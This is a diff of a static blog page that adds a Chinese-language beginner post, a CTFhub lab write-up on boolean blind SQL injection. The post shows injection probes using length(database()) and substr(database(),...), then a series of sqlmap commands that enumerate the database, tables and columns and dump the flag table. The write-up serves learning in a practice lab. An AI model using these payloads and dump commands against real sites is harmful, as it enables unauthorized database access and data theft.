@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -155,6 +155,73 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://strawberrygourd.github.io.git/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="strawberrygourd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">布尔盲注</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-06-19 11:12:23 / Modified: 11:26:26" itemprop="dateCreated datePublished" datetime="2021-06-19T11:12:23+08:00">2021-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="直接WP-以CTFhub题为例"><a href="#直接WP-以CTFhub题为例" class="headerlink" title="直接WP(以CTFhub题为例)"></a>直接WP(以CTFhub题为例)</h2><p>1.打开靶场，寻找一下注入点<br>输入1为正常页面<br><img src="/images/1.png"><br>2.输入id=1’ and 1=1,返回空页面<br><img src="/images/2.png"><br>输入id=1 and 1=1,返回正常页面<br><img src="/images/3.png"><br>3.判断数据库(database)的长度和名字<br>可以用id=1 and length(database())=1，<br>改变123….来一次次证明长度<br>再用id=1 and substr(database(),1,1)=‘a’ –+<br>依次确定名字.<br>以上过程比较鸡肋<br>这里我使用sqlmap<br>直接sqlmap -u+地址 –current-db<br><img src="/images/4.png"><br>得到database为sqli<br>4.找到数据库的表<br>sqlmap -u+地址 -D sqli –tables<br><img src="/images/5.png"><br>得到两个表名:flag 和 news<br>5.找到数据库表中的列名<br>sqlmap -u+地址 -D sqli -T flag –columns<br><img src="/images/6.png"><br>得到列名flag以及其类型<br>6.最后就是获得密码<br>sqlmap -u+地址 -D sqli -T flag -C flag –dump<br><img src="/images/7.png"><br>获得ctfhub的站内flag</p>
+<hr>
+<h2 id="第一次的感悟"><a href="#第一次的感悟" class="headerlink" title="第一次的感悟"></a>第一次的感悟</h2><p>首先就是找到kali linux用sqlmap这些软件是入门的第一步，找了很多博客才一步步了解到web的最基础入门。<br>然后就是学习注入，布尔盲注可以说是最简单的一种，一层层往下找，基本上没有阻挡，这种时间注入很好理解。<br>最后就是，给自己加个油！学习ctf的道路才刚刚开始！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://strawberrygourd.github.io.git/2021/06/16/First-Blood/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -178,10 +245,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-06-16 15:42:01 / Modified: 17:19:27" itemprop="dateCreated datePublished" datetime="2021-06-16T15:42:01+08:00">2021-06-16</time>
+      <time title="Created: 2021-06-16 15:42:01" itemprop="dateCreated datePublished" datetime="2021-06-16T15:42:01+08:00">2021-06-16</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-06-19 10:55:14" itemprop="dateModified" datetime="2021-06-19T10:55:14+08:00">2021-06-19</time>
+      </span>
 
   
 </div>
